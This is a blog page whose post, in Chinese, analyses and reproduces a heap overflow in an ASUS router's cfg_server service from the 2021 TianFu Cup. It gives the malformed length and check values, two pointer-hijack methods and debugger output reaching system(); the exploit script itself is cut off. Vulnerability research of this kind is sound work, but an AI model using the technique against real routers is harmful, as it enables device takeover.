<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fxc233.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="fxc233&#39;s blog">
<meta property="og:url" content="https://fxc233.github.io/index.html">
<meta property="og:site_name" content="fxc233&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="fxc233">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://fxc233.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>fxc233's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">fxc233's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/fxc233" class="github-corner" title="fxc233 GitHub" aria-label="fxc233 GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/23/2021-TianFuCup-ASUS-HeapOverflow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/23/2021-TianFuCup-ASUS-HeapOverflow/" class="post-title-link" itemprop="url">2021-TianFuCup-ASUS-HeapOverflow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-12-23 22:12:00" itemprop="dateCreated datePublished" datetime="2023-12-23T22:12:00+08:00">2023-12-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-24 20:55:14" itemprop="dateModified" datetime="2023-12-24T20:55:14+08:00">2023-12-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞分析大作业需要分析一个堆溢出，正好想起来21年天府杯攻破华硕所利用的堆溢出一直没有复现，于是就复现了一下，并记录于此。</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我手里有华硕的一个真机，不过是<strong>TUF-AX5400</strong>，型号是<strong>3.0.0.4.386_46061</strong>。这个版本中堆溢出漏洞已被修复，并且官网也无法下载到这个系列的存在漏洞的旧版本，于是我对<strong>cfg_server</strong>进行了patch，使其可以正常走到漏洞点，上传至设备中手动启动。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞存在于<strong>cfg_server</strong>中，这个程序会监听<strong>7788</strong>端口。接收的数据包的格式类似TLV，即（Type-Length-Value），不过多了一个check字段来检查数据合法性。会根据<strong>Type</strong>，来选择相对应的处理函数。</p>
<p>当<strong>Type</strong>为<strong>0x28</strong>时，会进入<strong>cm_processREQ_GROUPID</strong>函数，这个函数中存在如下调用链<strong>cm_packetProcess-&gt;aes_decrypt</strong>，来解密接收到的数据。整数溢出漏洞就出现在<strong>aes_decrypt</strong>中（当然也有很多其他Type所对应的函数会调用这个函数）。它的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">aes_decrypt</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> length, _DWORD *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">  <span class="keyword">if</span> ( !ctx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_CIPHER_CTX_new() !!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = EVP_aes_256_ecb();</span><br><span class="line">  v10 = (<span class="type">char</span> *)EVP_DecryptInit_ex(ctx, v9, <span class="number">0</span>, key, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">    v11 = EVP_CIPHER_CTX_block_size(ctx) + length;</span><br><span class="line">    v12 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v11);</span><br><span class="line">    v10 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(v12, <span class="number">0</span>, v11);</span><br><span class="line">      out_data_ptr = v10;</span><br><span class="line">      <span class="keyword">for</span> ( i = length; ; i -= <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        in_data_ptr = a2 + length - i;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt;= <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !EVP_DecryptUpdate(ctx, out_data_ptr, tmp_out_len, in_data_ptr, <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">795</span>);</span><br><span class="line">          EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">          <span class="built_in">free</span>(v10);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out_data_ptr += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">        *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !EVP_DecryptUpdate(ctx, out_data_ptr, tmp_out_len, in_data_ptr, i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">811</span>);</span><br><span class="line">          EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">          <span class="built_in">free</span>(v10);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out_data_ptr += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">        *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !EVP_DecryptFinal_ex(ctx, out_data_ptr, tmp_out_len) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptFinal_ex()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">822</span>);</span><br><span class="line">        EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先调用<strong>EVP_CIPHER_CTX_new</strong>为<strong>ctx</strong>结构体分配内存。下面就是对数据进行aes解密的过程。解密前会为数据分配内存，分配的大小是通过<strong>EVP_CIPHER_CTX_block_size(ctx) + length</strong>计算得出的，但是下面解密的时候循环次数又是由<strong>length</strong>控制。这里的<strong>length</strong>可以被我们控制，并且经过调试可以得知EVP_CIPHER_CTX_block_size(ctx)的值是0x10。如果我们控制<strong>length&#x3D;0xffffffff</strong>就可以导致整数溢出。使得<strong>malloc</strong>在分配一块较小内存的同时，会拷贝很长的数据到堆上，从而导致堆溢出。检查check字段合法性的函数定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> result, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( --a3 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *a2++;</span><br><span class="line">    result = CRC32_Table[(<span class="type">unsigned</span> __int8)(v3 ^ result)] ^ (result &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们控制<strong>length&#x3D;0xffffffff</strong>，由于小于0，则会直接返回，也就是我们把<strong>check</strong>字段设置为0即可通过数据合法性检查。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以溢出那么就寻找结构体指针，尝试控制程序执行流。参考了<code>@CataLpa师傅</code>的<a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">文章</a>和<code>@CQ师傅</code>的<a target="_blank" rel="noopener" href="https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/">文章</a>。知道了有这两个可以劫持的地方。</p>
<p>首先看一下我们所涉及到的两个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    ENGINE *engine;   </span><br><span class="line">    <span class="type">int</span> encrypt;</span><br><span class="line">    <span class="type">int</span> buf_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> oiv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">    <span class="type">int</span> key_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">void</span> *cipher_data;</span><br><span class="line">    <span class="type">int</span> final_used;</span><br><span class="line">    <span class="type">int</span> block_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> final[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">&#125; EVP_CIPHER_CTX; </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nid;</span><br><span class="line">    <span class="type">int</span> block_size;</span><br><span class="line">    <span class="type">int</span> key_len;</span><br><span class="line">    <span class="type">int</span> iv_len;       </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> (*init)(EVP_CIPHER_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">int</span> enc);</span><br><span class="line">    <span class="type">int</span> (*do_cipher)(EVP_CIPHER_CTX *ctx, <span class="type">unsigned</span> <span class="type">char</span> *out, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *in, <span class="type">unsigned</span> <span class="type">int</span> inl);</span><br><span class="line">    <span class="type">int</span> (*cleanup)(EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="type">int</span> ctx_size;</span><br><span class="line">    <span class="type">int</span> (*set_asn1_parameters)(EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="type">int</span> (*get_asn1_parameters)(EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="type">int</span> (*ctrl)(EVP_CIPHER_CTX *, <span class="type">int</span> type, <span class="type">int</span> arg, <span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">&#125;EVP_CIPHER; </span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>一个是劫持<strong>EVP_CIPHER_CTX</strong>结构体中的<strong>cipher</strong>指针。在调用<strong>EVP_DecryptUpdate</strong>函数时，会调用<strong>cipher</strong>中的<strong>do_cipher</strong>来进行具体的解密。如果我们可以伪造一个<strong>EVP_CIPHER</strong>结构体，就可以实现控制程序的执行流。这个加密指针的调用伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v12 = *ctx;</span><br><span class="line">(*(<span class="type">int</span> (__fastcall **)(_DWORD *, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">int</span>))(v12 + <span class="number">0x18</span>))(ctx, out, in, in_len);</span><br></pre></td></tr></table></figure>

<p>我们想要实现这样的劫持需要控制堆布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|   out_ptr    |</span><br><span class="line">|EVP_CIPHER_CTX|</span><br></pre></td></tr></table></figure>

<p>也就是我们解密后存放的数据的缓冲区被分配在<strong>EVP_CIPHER_CTX</strong>结构体缓冲区之前，这样就可以覆盖<strong>EVP_CIPHER_CTX</strong>的<strong>cipher</strong>，实现对<strong>EVP_CIPHER</strong>的伪造，从而控制程序执行流。</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个是劫持解密函数中所涉及的指针。方法一说到调用<strong>EVP_DecryptUpdate</strong>函数时，会调用<strong>cipher</strong>中的<strong>do_cipher</strong>来进行具体的解密。进一步调试可知<strong>do_cipher</strong>的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">do_cipher</span><span class="params">(<span class="type">int</span> ctx, <span class="type">int</span> out, <span class="type">int</span> in, <span class="type">unsigned</span> <span class="type">int</span> in_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> cipher_data; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v8 = EVP_CIPHER_CTX_block_size(ctx);</span><br><span class="line">  cipher_data = EVP_CIPHER_CTX_get_cipher_data(ctx);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= in_len )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = in_len - v8;</span><br><span class="line">    v11 = cipher_data;</span><br><span class="line">    v12 = in;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v12;</span><br><span class="line">      v12 += v8;</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))(v11 + <span class="number">0xF8</span>))(v13, out, v11);</span><br><span class="line">      out += v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 &gt;= v12 - in );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">EVP_CIPHER_CTX_get_cipher_data</span><span class="params">(<span class="type">int</span> ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(ctx + <span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显而易见，这是先获取了<strong>EVP_CIPHER_CTX</strong>结构体偏移为<strong>0x60</strong>地方的<strong>cipher_data</strong>指针（指向某个结构体，用来存放加解密相关数据）。再调用这个结构体偏移为<strong>0xF8</strong>处的函数指针<strong>AES_decrypt</strong>。经过调试可知，<strong>cipher_data</strong>指针总是指向我们的堆上。如果我们可以覆盖<strong>cipher_data</strong>指针偏移为<strong>0xF8</strong>处的函数指针<strong>AES_decrypt</strong>。那么也可以实现程序执行流的控制。</p>
<p>我们想要实现这样的劫持需要控制堆布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   out_ptr    |</span><br><span class="line">|  cipher_data |</span><br><span class="line">|EVP_CIPHER_CTX|</span><br><span class="line">或</span><br><span class="line">|EVP_CIPHER_CTX|</span><br><span class="line">|   out_ptr    |</span><br><span class="line">|  cipher_data |</span><br></pre></td></tr></table></figure>

<p>即我们不能破坏<strong>EVP_CIPHER_CTX</strong>结构体，以免无法调用<strong>cipher</strong>中的<strong>do_cipher</strong>，同时需要可以覆盖到<strong>AES_decrypt</strong>。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>我自己写exp的时候是尝试的第一种劫持方式。我构造出了如下布局：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x1e6bc &lt;aes_decrypt+260&gt;  bl      #EVP_DecryptUpdate@plt     &lt;EVP_DecryptUpdate@plt&gt; </span><br><span class="line">        ctx: 0xb6500978 —▸ 0xb6e9bb1c ◂— 0x1aa</span><br><span class="line">        out: 0xb6500760 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>这里值得一提的是，虽然开了aslr基地址会变化，但是经过我调试发现堆基地址大概率是0xb6300000，0xb6400000，0xb6500000。（可能因为是多线程的缘故，会为新线程准备一个堆基地址，这个地址变化不大）。我就把<strong>0xb6500760</strong>当作了<strong>EVP_CIPHER</strong>结构体的开头。之后覆盖<strong>EVP_CIPHER_CTX</strong>结构体中的<strong>cipher</strong>为<strong>0xb6500760</strong>即可。之后我又遇到了一个问题，就是在调用这个函数指针时，它的第一个参数是<strong>EVP_CIPHER_CTX</strong>结构体指针。由于我们每次只解密16字节，并且在覆盖<strong>cipher</strong>之后就无法继续解密，使得我这种布局只可以<strong>EVP_CIPHER_CTX</strong>结构体指针后面的控制4字节为我们想要执行的命令，这远远无法实现命令执行。经过替换gadget之后，最后也只构造出控制8字节的方式，可以勉强执行个<strong>reboot或者echo 1</strong>（:triumph:。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x528cc    mov    r0, r6</span><br><span class="line">  0x528d0    ldr    r3, [r5, #4]</span><br><span class="line">  0x528d4    ldr    r2, [sp, #0x38]</span><br><span class="line">  0x528d8    rev    r1, r1</span><br><span class="line">► 0x528dc    blx    r3                            &lt;system@plt&gt;</span><br><span class="line">       command: 0xb6500970 ◂— &#x27;echo 66&#x27;</span><br></pre></td></tr></table></figure>

<p>而第二种劫持方式的第一个参数为<strong>in</strong>，应该可以控制相当长的数据。不过由于更改堆布局很麻烦，笔者也就没有进一步探究，感兴趣的读者可以自行尝试。</p>
<p>以下是笔者第一种劫持方式的exp。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 